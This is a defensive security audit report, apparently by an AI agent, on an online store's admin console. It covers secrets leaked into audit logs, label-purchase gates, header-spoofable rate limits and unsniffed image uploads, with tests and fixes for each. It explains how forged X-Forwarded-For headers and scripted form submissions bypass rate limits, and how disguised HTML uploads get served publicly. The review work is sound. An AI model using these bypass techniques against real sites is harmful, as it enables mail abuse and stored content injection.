# Block I — Admin + Security (Phases 11, 12)

Scope per [`AUDIT-PARALLEL-ASSIGNMENTS.md`](../AUDIT-PARALLEL-ASSIGNMENTS.md):
IDOR on `[orderId]`/`[partnerId]`/`[userId]`, capability gates on money-spending
admin routes, the three client-IP resolvers, upload safety, and plaintext
credentials in `admin_audit_logs`.

**This is a defensive review.** Nothing here was tested against production. No
production write, no production browser session, no live credential was read.
Every reproduction below is either source-level or a local test.

Finding ids are namespaced `I-nn` per Rule 2. Cross-block items are marked
`CROSS-BLOCK:` and left for consolidation.

---

## Inventory: what was enumerated

- **75 admin API route files** under `src/app/api/admin/**`, every exported
  HTTP method, and the auth + capability call in each. 58 gate on a capability,
  17 do not; each of the 17 judged individually in I-02. (My first pass said 78
  files and 16 ungated, from a grep that missed `canView*` — corrected there.)
- **Every client-IP read** in the codebase (`x-forwarded-for`, `x-real-ip`,
  `x-vercel-forwarded-for`): 10 call sites, 3 distinct resolution strategies.
- **Every parameterised non-admin API route** (4 files) for IDOR.
- **Every upload endpoint** (5 files) for type/size/extension safety.
- **Every writer to `admin_audit_logs`** (30 call sites) for secret capture.

---

## I-01 — Email provider secrets are stored plaintext in `admin_audit_logs` and rendered by the audit-log viewer

**Grade:** `DATABASE-PROVEN` (leak) + `BEHAVIORAL-TEST-PROVEN` (fix) ·
**Severity:** P0 · **Status:** FIXED at the read boundary; **rotation still owed**

### What happens

`PATCH /api/admin/settings` saves each settings field by calling
`upsertControlValue`, which inserts an `admin_control_upsert` row into
`admin_audit_logs` with the **raw value** in `metadata.value`
(`src/lib/admin-control.ts:179-193`):

```ts
metadata: {
  value: input.value,          // <-- raw, unredacted
  actorUsername: ...,
  ipAddress: ...,
  userAgent: ...,
},
```

The fields routed through that function include every secret the console owns
(`src/app/api/admin/settings/route.ts:74-97`):

| Section | Key | What it is |
|---|---|---|
| `email` | `smtp_password` | SMTP account password |
| `email` | `resend_api_key` | Resend API key |
| `email` | `sendgrid_api_key` | SendGrid API key |
| `payment_processor` | `secret_key` | Processor secret key |
| `payment_processor` | `webhook_secret` | Webhook signing secret |

So `admin_audit_logs` accumulates a permanent, unencrypted, append-only history
of **every secret ever configured**, including ones since rotated.

### Why the render half matters

`src/app/admin/audit-log/page.tsx:16-23` prints metadata verbatim:

```ts
const METADATA_KEYS_TO_HIDE = new Set(["performedAt", "ipAddress", "userAgent", "performedBy"]);
...
entries.map(([key, value]) => `${key}: ${...String(value)}`).join(" • ");
```

`value` is not in the hide-set. The viewer's `includeConfigSaves` checkbox
(page.tsx:50, `?includeConfigSaves=1`) is exactly the switch that un-suppresses
`admin_control_upsert` rows. So:

```
/admin/audit-log?includeConfigSaves=1&targetTable=payment_processor
```

renders `value: <the processor secret key>` in the Details column, in plain
text, to any manager-or-above session.

### Why this is a real control failure, not a theoretical one

The settings API **deliberately never returns these values**. It answers with
booleans only:

- `getPaymentProcessorAdminSettings` → `secretKeySet: Boolean(...)`,
  `webhookSecretSet: Boolean(...)` (`src/lib/payment-processor-config.ts:61-72`)
- `getEmailAdminSettings` → `passwordSet`, `resend.apiKeySet`,
  `sendgrid.apiKeySet` (`src/lib/email/settings.ts:161-182`)

The masking is intentional and documented in the route's own comment. The audit
log defeats it. The same operator who cannot read the current key through the
settings screen can read it — and every previous one — through the audit log.

### Confirmed against production, read-only

Counted rows and value **lengths** only — no secret value was read, printed or
stored anywhere in this audit:

```sql
select target_table, target_id, count(*) as rows_written,
       count(*) filter (where coalesce(length(metadata->>'value'),0) > 0) as nonempty,
       max(coalesce(length(metadata->>'value'),0)) as max_len
from public.admin_audit_logs
where action = 'admin_control_upsert'
  and (target_id in ('smtp_password','resend_api_key','sendgrid_api_key','secret_key','webhook_secret')
       or target_table = 'payment_processor')
group by 1,2;
```

| section | key | rows | non-empty | max value length | first write |
|---|---|---|---|---|---|
| `email` | `resend_api_key` | 2 | **2** | 36 | 2026-07-21 |
| `email` | `smtp_password` | 1 | **1** | 19 | 2026-07-21 |
| `fulfillment` | `webhook_secret` | 1 | **1** | 64 | 2026-07-30 |
| `payment_processor` | `publishable_key` | 12 | 0 | 0 | 2026-07-21 |
| `payment_processor` | `provider` / `enabled` / `display_name` | 12 each | — | — | 2026-07-21 |

Three live secrets are in the table today. A 36-character `resend_api_key` is
the length of a real Resend key; a 64-character `fulfillment/webhook_secret` is
a full hex signing secret.

Two things this narrows:

- **`payment_processor/secret_key` and `payment_processor/webhook_secret` have
  no rows at all.** The processor secret was never saved through this path, so
  the card-payment credential is not exposed here. That is the single biggest
  reason this is P0-with-a-bounded-blast-radius rather than P0-critical.
- **`fulfillment/webhook_secret` exists anyway.** The settings route's own
  comment (`route.ts:100-105`) says fulfillment deliberately accepts no
  credentials, webhook secret included. The row predates that decision
  (2026-07-30) and was never cleaned up — the comment describes the code, not
  the table.

### Blast radius

1. **Retention.** Rotating a leaked processor key does not remove the leaked
   value; the old row stays forever. There is no redaction path and no TTL on
   `admin_audit_logs`.
2. **Widened access.** Anything with read access to `admin_audit_logs` now holds
   payment and email credentials: the Supabase console, a database backup, a
   read-replica, an analytics export, a support engineer with table access.
   None of those are in the settings screen's threat model.
3. **Realtime broadcast — checked, and it is closed.**
   `src/components/admin-control-center-client.tsx:227` subscribes to
   `postgres_changes` on `admin_audit_logs` with the **anon key**, which would
   put secret-carrying rows on a websocket reachable by anyone holding
   `NEXT_PUBLIC_SUPABASE_ANON_KEY`. Verified in production that it is not:

   | check | result |
   |---|---|
   | `pg_class.relrowsecurity` on `admin_audit_logs` | `true` |
   | policies | 2 (`admin_audit_logs_admin_only` SELECT, `..._insert_admin` INSERT) |
   | policy predicate | `current_auth_role() = 'admin'` |
   | `current_auth_role()` | `select auth.jwt() ->> 'role'` |

   A Supabase JWT's `role` claim is `anon` or `authenticated`, never `admin`, so
   the policy is effectively deny-all for both — correct, if misleadingly named.
   The service-role key bypasses RLS, which is how the server still reads it.
   **Negative control for this claim:** the same query shows
   `rls_enabled = true` on `admin_credentials`, `admin_sessions` and
   `admin_login_attempts`, so the result is not an artefact of querying the
   wrong catalogue.

### Root cause

`upsertControlValue` is a *generic* config writer with no notion of
sensitivity, and it doubles as the audit writer. One function is being asked to
do two jobs with opposite requirements: config storage must keep the value,
audit history must not.

### Why the obvious fix is the wrong one

The first instinct — stop writing the value — breaks the store. This table is
**not only** an audit log: `admin_control_current` is a `DISTINCT ON` view over
its `admin_control_upsert` rows, and `getControlSnapshot` reads
`metadata.value` back to configure email sending and the payment processor
(`admin-control.ts`, CONTROL_VIEW comment at :52-66). Redacting at the write
takes email delivery offline.

That is the actual root cause, stated plainly: **one table is doing two jobs
with opposite requirements.** Config storage must keep the value; audit history
must not have it.

### Fix applied — close the read boundary

There are exactly two readers, and only one of them is an audit reader:

| reader | purpose | needs raw value? |
|---|---|---|
| `admin-control.ts` → `readControlRows` | CONFIG | **yes** — untouched |
| `admin-audit-log.ts` → `getAuditLogRows` | AUDIT | no — now redacted |

New `src/lib/admin-audit-redaction.ts` redacts at the second one:

- **Rule 1 — settings saves.** The secret sits in `metadata.value` while its
  *name* is in `target_id`. `value` is not a secret-sounding key, so a generic
  rule cannot see it; `target_id` is what classifies the row.
- **Rule 2 — everything else.** Any metadata field whose own name marks it a
  credential is redacted in *any* audit row, at any nesting depth. This is what
  stops a future writer reopening the hole under a different action.

Classification is by canonicalised key substring (`smtp_password`,
`smtpPassword`, `SMTP_PASSWORD` all match), so a future `mailgun_api_key` is
covered without an edit. The settings API's `secretKeySet` / `passwordSet`
booleans are excepted, so operational history stays readable.

`getAuditLogRows` now returns redacted metadata; the viewer at
`src/app/admin/audit-log/page.tsx` inherits it with no change of its own.

### Reproduction and verification

`src/lib/admin-audit-log-redaction.test.ts` drives the real `getAuditLogRows`
against a stubbed Supabase client and re-implements the page's Details-cell
renderer, so the assertion is against what an operator would actually see.

Before the fix — **red for the right reason**, not on scaffolding:

```
AssertionError: expected 'value: re_LIVE_0123456789abcdef012345…' not to contain 're_LIVE_0123456789abcdef0123456789ab'
Received: "value: re_LIVE_0123456789abcdef0123456789ab • actorUsername: owner"
   Tests  7 failed | 2 passed (9)
```

The 2 that passed are the negative controls — non-secret settings still
readable, actor still recorded — and they passed before and after, which is the
point of them.

After: **23 passed (23)**. Full suite **204 files / 3595 tests passed, 1 file
and 7 tests skipped, zero regressions**; `tsc --noEmit` clean; eslint clean.

### Negative controls

Each mutation, and which tests caught it:

| # | Mutation | Result |
|---|---|---|
| M1 | Remove the `redactAuditMetadata` call in `getAuditLogRows` | 7 failed — the leak returns |
| M2 | `isSecretKeyName` always returns `false` | 16 failed |
| M3 | `redactAuditMetadata` always returns `null` | 12 failed — over-redaction caught too |
| M4 | Drop the `NON_SECRET_EXCEPTIONS` guard | **22 passed — NOT CAUGHT** |
| M5 | Stop recursing into nested objects | 3 failed |
| M6 | Drop the generic key rule, keep only the control-`value` rule | 2 failed |

**M4 found a real defect in the fix.** `publishablekey` matches no marker, so
listing it as an exception was dead code implying protection that was not
there; the two entries that *do* fire (`secretKeySet`, `passwordSet`) had no
test. Dead entry removed, a test added for the live ones, and M4 re-run: now
**1 failed** — caught. Restored, and 23/23 green again.

### Still owed — needs the owner

Redaction at the read does **not** remove the value from the table, from a
backup, or from anyone who already had access.

**`OWNER DECISION NEEDED:`**

1. **Rotate** the Resend API key, the SMTP password, and the
   `fulfillment/webhook_secret`. This is the substantive remediation; the code
   fix only stops the bleeding. Rotation is a credential operation, not a code
   change, and it is the owner's to perform.
2. **Redacting the historical rows** is a production write and is blocked on
   approval under Rule 4. Note it cannot be done blindly: blanking
   `email/smtp_password` and `email/resend_api_key` would blank the **live
   config**, because those rows *are* the config. The correct order is rotate
   first, re-save through the settings screen, and only then redact rows older
   than the newest per key.
3. **Structural:** splitting the settings store out of `admin_audit_logs` is
   the durable fix. Out of scope for this block — recorded as
   **CROSS-BLOCK:** `src/lib/admin-control.ts` — config and audit share one
   table; consider a dedicated `admin_control_values` table with the audit row
   carrying only a fingerprint.

---

## I-02 — CORRECTED. The capability-gate gap is real but far narrower than I first filed, and the money-spending path is dead code in production

**Grade:** `DATABASE-PROVEN` · **Severity:** P3 today / **P1 the day
`SHIPPO_ALLOW_LABEL_PURCHASE` is set to `true`** · **Status:** OPEN as a latent
risk; no code change made

### Correction to the first version of this finding

The version of I-02 committed earlier in this block was **overstated, and the
cause was a defect in my own method.** I enumerated capability gates with a grep
for `canManage[A-Za-z]*` and did not include `canView[A-Za-z]*`. Two capability
functions are named `canViewProfit` and `canViewAuditLog`, so every route gated
by those read as ungated.

Concretely wrong in the first version:

| Claim | Reality |
|---|---|
| "`tax/export` requires nothing … three exports of comparable sensitivity, two gated, one not" | **False.** `tax/export:17` calls `canViewProfit(session.role)` — manager+. There is no inconsistency. |
| "`orders/[orderId]/communications` POST **sends a message to a customer**" | **Overstated.** It re-sends emails *already queued as failed for this order* and reaches no business logic to do it (`route.ts:9-14`). It cannot compose or send new content. |
| "16 routes carry a session check only" | **Wrong count.** Corrected below. |

Corrected enumeration, pattern `\bcan[A-Z][A-Za-z]*\b` across every route file:

- **75** route files under `src/app/api/admin/`
- **58** call a capability gate
- **17** do not (16 of those still require an admin session; `auth/logout`
  correctly needs neither)

### The 17, each judged individually

Read in full including header comments, because this codebase documents its
decisions and a documented decision is authoritative intent, not a defect.

| Route | Verdict |
|---|---|
| `auth/logout`, `auth/session` | Correct. Logout must work without a gate; session returns the caller's own identity. |
| `account` PATCH | **Correct, and documented.** *"any signed-in admin can change their OWN password or username after re-entering their current password. No role gate — you can always manage your own credentials."* Re-authenticates via `validateAdminCredentials(session.username, …)` at `:25`, and every write targets `session.username`. Cannot reach another account and cannot set a role. |
| `metrics`, `fulfillment/queues`, `fulfillment/labels/print`, `orders/[orderId]/packing-slip`, `orders/[orderId]/shipping/label/print`, `orders/[orderId]/shipping/rates`, `shipping/diagnostics`, `inventory-reservation-check`, `checkout-preflight` | Read-only operational views. `metrics` carries no profit/COGS/margin field, so `canViewProfit` is not being bypassed. |
| `orders/[orderId]/communications` | Bounded retry of already-queued failed mail. No new content possible. |
| `orders/[orderId]/shipping/sync` POST | Documented as *"the ONLY writing endpoint left in the shipping surface … and it still cannot spend money: creating a Shippo order is a record, not a purchase."* Verified against `syncOrderToShippo`. |
| `fulfillment/batches` POST/PATCH | Grouping and picking state. No money, no customer contact. |
| `orders/[orderId]/shipping/label` POST/DELETE, `fulfillment/labels` POST | **The only real question.** See below. |

### The label-purchase routes: a documented decision, and a dead path

`orders/[orderId]/shipping/label` states the decision explicitly (`route.ts:16-21`):

> *"There is no role gate beyond 'is an admin': packing and shipping is the
> daily work of every account that gets into this dashboard, and making staff
> wait for a manager to void a mis-bought label would leave a wrong label live.
> Both actions are written to admin_audit_logs with who, when and what it cost."*

That is a considered business decision with a stated rationale and a named
compensating control. Under the execution plan's step 2 it is authoritative
intent. I do not overrule it.

The controls that actually exist on the purchase path, all verified in source:

1. **A kill switch, defaulting to OFF.** `labelPurchasingEnabled()`
   (`src/lib/shippo/service.ts:1074-1076`) returns true only when
   `SHIPPO_ALLOW_LABEL_PURCHASE` is exactly `"true"`. Absent or anything else →
   purchasing refuses with `PURCHASING_DISABLED_MESSAGE`: *"Vanta does not buy
   postage."*
2. Checked twice — at the money boundary inside `purchaseLabelForOrder` and
   again up front in the batch route, so a stray batch call gets one clear
   refusal instead of N.
3. **Explicit spend confirmation in the request body**: `confirmSpend !== true`
   is refused (`fulfillment/labels/route.ts`), so a replayed fetch or stale tab
   cannot buy.
4. **25 orders per request** (`MAX_ORDERS_PER_PURCHASE`).
5. An atomic `label_purchase_claimed_at` claim, a `Shippo-Idempotency-Key` keyed
   on the order, and an audit row recording what was *actually* bought.

### Answering the system map's open question (line 440)

`PHASE1-SYSTEM-MAP.md:440` asks:

> *"Is SHIPPO_ALLOW_LABEL_PURCHASE set anywhere? If it is false everywhere,
> purchaseLabelForOrder / purchaseBatchLabels are dead code and the only live
> label path is applyTransactionCreated — which changes the severity ordering of
> several findings."*

**Answered, with production data.** `purchaseLabelForOrder` sets
`label_purchase_claimed_at` atomically *before* it can buy anything, so that
column is the fingerprint of Vanta's own purchase path having run:

```sql
select count(*) as total_orders,
       count(*) filter (where label_purchase_claimed_at is not null) as ever_claimed,
       count(*) filter (where label_purchased_at    is not null) as ever_purchased,
       count(*) filter (where label_voided_at       is not null) as ever_voided,
       count(*) filter (where shippo_transaction_id is not null) as has_txn,
       count(*) filter (where shippo_order_id       is not null) as synced_to_shippo
from public.orders;
```

| total_orders | ever_claimed | ever_purchased | ever_voided | has_txn | synced_to_shippo |
|---|---|---|---|---|---|
| 15 | **0** | 2 | 0 | 2 | 5 |

**Zero claims, ever — while two labels exist.** Vanta's own purchase path has
never executed in production. The two labels arrived through
`applyTransactionCreated`, the webhook fired when a label is bought by hand in
Shippo's dashboard, exactly as the system map describes the intended workflow.

So today: `purchaseLabelForOrder` and `purchaseBatchLabels` are **dead code in
production**, and no admin of any role can spend a cent through this app.

### What remains, stated at its true size

Two things, both latent rather than live:

1. **No cumulative spend cap anywhere.** The 25-per-request cap bounds one
   request, not a sequence of them; nothing limits spend per hour, per day or
   per account. The compensating control named in the route's rationale is the
   audit log, which is *after the fact* — it records a spend, it does not stop
   one. The moment `SHIPPO_ALLOW_LABEL_PURCHASE=true` is set, a single
   compromised **staff** session can buy postage in unbounded sequential
   batches, and nothing intervenes until someone reads the audit log.
2. **The bulk route inherits a rationale that was never written down at it.**
   The single-label route argues its no-role-gate decision; `fulfillment/labels`
   POST does not restate it. Buying up to 25 labels at once is a materially
   different act from buying one, and it should say so or say why not.

### No code change made — deliberately

Adding `canManageFulfillment` would overrule a documented decision on a path
that cannot currently spend money, in a file another session may also be
editing, on the strength of a risk that is conditional on an env var nobody has
set. That trade is wrong. Recorded, not patched.

**`OWNER DECISION NEEDED:`** before `SHIPPO_ALLOW_LABEL_PURCHASE` is ever set to
`true`, decide (a) whether a per-day or per-account spend cap should exist, and
(b) whether bulk purchase should sit behind manager+ even though single purchase
deliberately does not. Both are cheap to add *before* the switch is flipped and
awkward afterwards.

**CROSS-BLOCK:** `src/lib/shippo/service.ts` is Block D's primary file. The
kill-switch and claim behaviour above was read, not modified. Block D should
know that `ever_claimed = 0` proves its purchase path is untested in production
by anything other than unit tests.

## I-03 — Public rate limits are keyed on a client-controlled header; the same codebase already calls that header untrusted

**Grade:** `BEHAVIORAL-TEST-PROVEN` · **Severity:** P1 · **Status:** FIXED

Three distinct client-IP resolution strategies exist:

**1. The hardened one** (`src/lib/admin-auth.ts:60-71`), used by admin login
lockout and by `resolveShopperIdentity`:

```ts
const trusted = request.headers.get("x-vercel-forwarded-for") ?? request.headers.get("x-real-ip");
if (trusted && trusted.trim()) return normalizeIpAddress(trusted);
return normalizeIpAddress(request.headers.get("x-forwarded-for") ?? null);
```

Its own comment states the rule: *"x-forwarded-for is only a last resort — a
client can PREPEND spoofed entries to it, so its leftmost token is
attacker-controlled and must never be the primary lockout key."*

**2. The ad-hoc one**, `x-forwarded-for` **first**, duplicated in three public
POST endpoints:

- `src/app/api/contact/route.ts:34` → `checkRateLimit('contact:'+key, 3, 600)`
- `src/app/api/wholesale/route.ts:49` → same shape
- `src/app/api/catalog/back-in-stock/route.ts:10` → `checkRateLimit(..., 10, 3600)`

**3. Fire-and-forget telemetry reads** (`analytics/track:122`,
`email/click:71`, `ads/tiktok-test-event:81`) — no security decision rides on
these; noted for completeness, not as a defect.

### The proven part

Strategies 1 and 2 cannot both be correct. The codebase asserts in one place
that the leftmost `x-forwarded-for` token is attacker-controlled, and in three
other places uses exactly that token as the sole key for an abuse control. That
inconsistency is proven by reading the files, independent of who is right about
the hosting proxy's behaviour.

### The consequence, if strategy 1's own comment is right

`X-Forwarded-For: <random>` on each request puts every request in a fresh
bucket, and the limits are gone:

- `contact` — 3 submissions / 10 min becomes unbounded. Each accepted
  submission sends **two emails** (notification + auto-reply) through the
  configured provider. Unbounded outbound mail is a deliverability and cost
  event, and the auto-reply is reflected to an attacker-supplied address, so it
  is a mail-reflection vector.
- `wholesale` — same shape, same unbounded send.
- `back-in-stock` — 10/hour becomes unbounded row insertion.

Both forms have a honeypot field and a 3-second `startedAt` gate. Neither
survives a scripted client: the honeypot is simply left blank and `startedAt` is
set 3 seconds in the past.

**Secondary:** `rate_limit_hits.bucket` has unbounded cardinality. Varying the
header writes a new row per request, and cleanup is only a 1%-sampled delete of
rows older than 24h (`src/lib/rate-limit.ts:41-47`). Bypassing the limit also
grows the limiter's own table.

### I-03b — the same code fails the OTHER way too, and the test found it

Writing the reproduction turned up a second defect I had not predicted, in the
opposite direction.

`getClientKey` reads `x-forwarded-for ?? x-real-ip ?? "unknown"`. On a host that
sets `x-vercel-forwarded-for` and `x-real-ip` but **not** `x-forwarded-for`, the
first two both miss and every visitor on earth keys into the single literal
bucket `contact:unknown`. Three submissions per ten minutes — total, for
everyone.

So one header shape removes the limit and another collapses it onto all
customers. This is why the "two genuinely different clients still get two
buckets" case is in the suite: a fix that only chases the bypass could satisfy
the spoofing tests by keying everything to a constant, and that is mutation N3
below.

### Reproduction

`src/lib/public-form-rate-limit-key.test.ts` imports the **real** `POST`
handlers for all three routes, mocks only `checkRateLimit` to capture the bucket
string, and sends requests carrying the headers a proxy would set plus a
prepended forgery.

Before the fix — red for the right reason, on all three routes:

```
× contact: same real client, ten forged headers, one bucket
× wholesale: same real client, ten forged headers, one bucket
× back-in-stock: same real client, ten forged headers, one bucket
    AssertionError: expected 10 to be 1

× two genuinely different clients still get two buckets
    AssertionError: expected 1 to be 2        <- I-03b
   Tests  4 failed | 1 passed (5)
```

Ten forged headers produced **ten distinct buckets**: the limit is not a limit.
Two genuinely different clients produced **one**: the limit is a site-wide one.

### Fix applied

New `src/lib/request-ip.ts` holds the single resolver. `admin-auth.ts` no longer
defines its own — it re-exports from there, so every existing importer keeps
working and there is exactly one implementation. The three public routes drop
their private `getClientKey` copies and call
`rateLimitKeyForRequest(prefix, request)`.

The `x-forwarded-for` fallback is kept deliberately, and the reasoning is
written into the module: on a host that sets no trusted header (local dev, a
self-hosted proxy) a forgeable key still separates ordinary traffic, whereas
returning null recreates I-03b.

After: **5 passed (5)**. Full suite **205 files / 3600 tests passed**, 1 file /
7 skipped, zero regressions. `tsc --noEmit` clean, eslint clean.

### Negative controls

| # | Mutation | Result |
|---|---|---|
| N1 | Read `x-forwarded-for` first — the original defect | 4 failed |
| N2 | Drop the `x-forwarded-for` fallback entirely | 1 failed — I-03b's guard fires |
| N3 | Return a constant bucket for everyone | 5 failed — the naive "fix" is rejected |
| N4 | Stop trimming the chain, use the whole header | 1 failed |

All four caught. N3 is the one that matters: it is the shortcut that satisfies
"one bucket per client" by giving everyone the same bucket, and the suite
rejects it.

### What is still NOT proven

Whether Vercel's edge overwrites `x-forwarded-for` before the function sees it.
If it does, the old code was safe by accident against spoofing — but I-03b was
real regardless of that answer, and the fix is correct under either. Confirming
the edge behaviour needs a forged-header request against a **preview**
deployment; not run, and not to be run against production.

---

## I-04 — CORRECTED. `GET /api/ads/purchase-event/[orderId]` had no sweep protection and writes on a GET; the "data leak" half was my error

**Grade:** `BEHAVIORAL-TEST-PROVEN` · **Severity:** P3 (down from P2) ·
**Status:** FIXED

### Correction to the first version of this finding

I filed this as "a second, weaker door to order data", claiming the route leaks
`amountPaid` plus per-line product names, quantities and unit prices that
`order-status` deliberately withholds.

The first half is true — it does return those (`route.ts:98-109`, reaching the
client inside `event.properties.contents` via `buildPurchase`, which carries
`content_name`, `quantity` and `price`). **The framing was wrong**, and reading
the confirmation page is what showed it:

`src/app/order-confirmation/[orderId]/page.tsx:57` selects
`order_items(product_name, quantity, line_total)` and `amount_paid` and renders
them to **anyone holding the link**. It masks the email
(`maskEmail`, `page.tsx:29-36`) and nothing else, and says why: *"The
confirmation URL is an unguessable bearer token but can circulate."*

So the priced basket is already, deliberately, visible to a link holder. This
route exposing the same class of data to a holder of the same id is **consistent
with the documented model, not a new leak**. `order-status` is the outlier for
being *stricter* than its siblings, not this route for being weaker. Severity
drops P2 → P3, and the recommendation to strip `unitPrice`/`productName` is
withdrawn — it would have degraded ad measurement to fix a non-defect.

### What is actually left, and it is real

**No sweep protection, on the one route in the family that also writes.**

`checkout/order-status/[orderId]` rate limits at 120/min per IP and states the
reason: *"Rate limited per IP so the id space cannot be swept."*
`ads/purchase-event/[orderId]` had **no limit at all**, while a GET on it:

- upserts `ad_purchase_events_sent` (`route.ts:287-296`),
- POSTs a conversion to TikTok (`:260`) and to Reddit (`:242`).

Same trust model, same id space, one door watched and one not.

**Bounding it honestly** — I checked rather than assumed:

- The outbound sends are guarded by `alreadySent`, read from
  `ad_purchase_events_sent`, and that table exists in production (confirmed via
  `pg_class`: RLS enabled). So sends are **once per order**, not per request.
  The amplification story I implied is not there.
- A UUIDv4 order id is 122 bits of entropy. Sweeping it is not feasible whether
  or not a limit exists. The limit is defence in depth, exactly as it is on
  `order-status`.

That is why this is P3 and not higher. It is still worth closing: two budgets on
one id space is the same gap wearing a smaller number, and the write-on-GET
makes this the member of the family that least deserves the weaker treatment.

**`?inspect=1` is correctly gated** (`route.ts:200-201`, admin session required)
and the reasoning for checking it late rather than early is sound.

### Fix applied

The same limit and the same key as its sibling: `checkRateLimit(…, 120, 60)`
keyed through `rateLimitKeyForRequest`, so it inherits the single hardened
resolver from I-03 rather than growing a fourth opinion about client IPs.

A tripped limit answers `{ found: false, event: null }` with `Retry-After`
rather than a bare error, because the confirmation page reads this response and
"no event" is the shape it already handles. The route's own rule — *"the one
thing it must never do is guess that a purchase happened"* — holds on the 429
path too.

### Reproduction and verification

Red first for the right reason — no bucket was ever recorded, and a limited
request returned 404 instead of 429:

```
× rate limits every request                       expected [] to have a length of 1
× keys the limit on the proxy-supplied IP         (no bucket to inspect)
× answers 429 with Retry-After once it trips      expected 404 to be 429
   Tests  3 failed | 1 passed (4)
```

After: **4 passed (4)**. Full suite **208 files / 3628 tests passed**, 1 file /
7 skipped, zero regressions. `tsc --noEmit` clean, eslint clean.

### Negative controls

| # | Mutation | Result |
|---|---|---|
| A1 | Remove the limit | 3 failed |
| A2 | Key it on the forgeable `x-forwarded-for` | 1 failed |
| A3 | Drop the `Retry-After` header | 1 failed |
| A4 | Return 429 carrying a truthy `event` | 1 failed |

All four caught. A4 is the one that matters: it is the mistake that would make a
throttled request look like a conversion.

**CROSS-BLOCK:** `src/app/api/ads/**` is in no block's primary file list. The
fix was made here because it is a security control in this block's lens;
consolidation should confirm no other session touched the file.

## I-05 — Product image upload trusts a client-supplied MIME type and a client-supplied extension, into a public bucket — and a second route skips even that

**Grade:** `BEHAVIORAL-TEST-PROVEN` + `DATABASE-PROVEN` (bucket config) ·
**Severity:** P1 (raised from P2 — see below) · **Status:** FIXED

All five upload endpoints were checked. The COA path is the reference
implementation and it is correct (`src/lib/admin-coa.ts:234-257`): size cap,
declared-type allow-list, **magic-byte sniff** (`sniffCoaFileType`), storage
path extension derived from the *sniffed* mime, `contentType` set from the
sniffed mime, private bucket, signed URLs.

The product-image path does none of the sniffing.

**`POST /api/admin/upload-image`** (`route.ts:34-40`) checks `file.type` against
an allow-list and caps size at 8 MB. `file.type` is the `Content-Type` the
client wrote into its own multipart part — it is not derived from the bytes.
Then `uploadProductImageToStorage` (`src/lib/admin-products.ts:1058-1088`):

```ts
const extension = (input.file.name.split(".").pop() ?? "png").toLowerCase().replace(/[^a-z0-9]/g, "");
const fileName = `${input.productId}/${Date.now()}-${randomUUID()}.${extension || "png"}`;
...
.upload(fileName, Buffer.from(bytes), { contentType: input.file.type || "application/octet-stream" });
...
const { data: publicUrlData } = supabaseAdmin.storage.from(bucket).getPublicUrl(fileName);
```

The bytes are never inspected. The extension comes from the client's filename.
The bucket is **public**, and the resulting URL is attached to a product, so the
storefront links to it.

**`PATCH /api/admin/products/[productId]`** with `multipart/form-data` and
`action=upload_image` (`route.ts:56-72`) reaches the same helper with **no type
check and no size check at all** — not even the forgeable `file.type`
allow-list, not the 8 MB cap. Two doors to one storage writer, one of them
weaker.

### Raised to P1 by the reproduction

I filed this P2 on the reasoning that both routes need `canManageProducts`.
Running it changed one fact: through the `products/[productId]` path, the stored
`contentType` came back as **`text/html`**.

```
× stores the contentType the BYTES say, not the one the client declared
    AssertionError: expected 'text/html' to be 'image/png'
```

That is not "an unvalidated blob in a bucket", it is an attacker-chosen document
served as HTML from a public URL the storefront links to. Still manager-gated,
so not externally reachable — but the consequence of one compromised or
malicious manager account is stored content served as HTML, not a broken image.
P1.

### What the live bucket does and does not save you from

Verified read-only against production `storage.buckets`:

| bucket | public | size limit | allowed mime types |
|---|---|---|---|
| `product-images` | **true** | 10 MB | `image/png`, `image/jpeg`, `image/webp`, `image/avif` |
| `coa-documents` | false | 20 MB | `application/pdf`, `image/png`, `image/jpeg`, `image/webp` |
| `payment-proofs` | false | *none* | *none* |

Two things follow:

1. Supabase enforces `allowed_mime_types` against the **declared** content type
   — the same client-controlled value — so it is not an independent check. It
   would have blocked `text/html`, but only because the client volunteered it;
   declaring `image/png` while uploading HTML passes both.
2. `image/gif` is in the route's allow-list and **not** in the bucket's. A GIF
   upload was always going to fail at storage. Recorded separately as I-06.

`payment-proofs` having no limits at all looked alarming and is not: see the
PASS in I-05b.

### I-05b — the customer-facing upload is already correct (PASS)

`POST /api/checkout/submit-payment` is unauthenticated (order-UUID capability
URL) and accepts a file, which makes it the highest-risk upload in the system.
It is also the one that was done properly (`src/lib/payment-proof-storage.ts`):
rate limited via the hardened resolver, 8 MB cap, declared-type allow-list,
**magic-byte sniff**, extension and `contentType` both from the sniffed type,
private bucket, signed URLs with a 1-hour TTL. No defect. Recorded because a
"no limits" bucket row is misleading on its own — the limits are in the code.

### Fix applied

The bytes decide the type, in the helper both routes funnel through.

There were already **two** correct sniffers and one missing one — the same
divergence pattern as I-03's three IP resolvers:

| location | status before |
|---|---|
| `payment-proof-storage.ts` `detectImageType` | correct, private, customer-facing |
| `coa-format.ts` `sniffCoaFileType` | correct, exported, own allow-list (+PDF) |
| `admin-products.ts` | **nothing** — public bucket |

New `src/lib/image-upload-safety.ts` is now the one image sniffer.
`uploadProductImageToStorage` sniffs, rejects a non-image, derives the extension
*and* the stored `contentType` from the sniffed type, and enforces the 8 MB cap
**inside the helper** so the route that checks nothing inherits it.
`payment-proof-storage.ts` delegates to the shared sniffer instead of keeping a
second copy — behaviour-preserving, because its declared-type allow-list still
runs first and still excludes AVIF, so the wider shared sniffer cannot widen
that gate. COA keeps its own: its allow-list includes PDF and excludes
GIF/AVIF, and merging two different allow-lists into one function would make
each caller's contract less obvious.

Brand checks matter and are tested: `RIFF` alone is also WAV and AVI, and
`ftyp` alone is also MP4 and HEIC, so both require the brand at offset 8.

### Reproduction and verification

Before the fix — red for the right reason, HTML, SVG and a Windows executable
all stored, the `.html` extension honoured, `text/html` recorded:

```
× rejects an HTML payload declared as image/png       promise resolved instead of rejecting
× rejects an SVG declared as image/png                promise resolved instead of rejecting
× rejects an executable declared as image/webp        promise resolved instead of rejecting
× never lets the client's filename choose the stored extension
      expected 'p1/1787…-….html' to match /\.png$/
× stores the contentType the BYTES say                expected 'text/html' to be 'image/png'
× caps size in the helper                             promise resolved instead of rejecting
   Tests  6 failed | 1 passed (7)
```

The 1 that passed is "still accepts a genuine image" — the control that stops
the fix being "reject everything".

After: **24 passed (24)** across both suites. Full suite **207 files / 3624
tests passed**, 1 file / 7 skipped, zero regressions — including the existing
`payment-proof-storage.test.ts`, which is what proves the delegation changed no
behaviour there. `tsc --noEmit` clean, eslint clean.

### Negative controls

| # | Mutation | Result |
|---|---|---|
| P1 | Sniff, but fall back to the declared type when null | 3 failed |
| P2 | Extension back from the client filename | 1 failed |
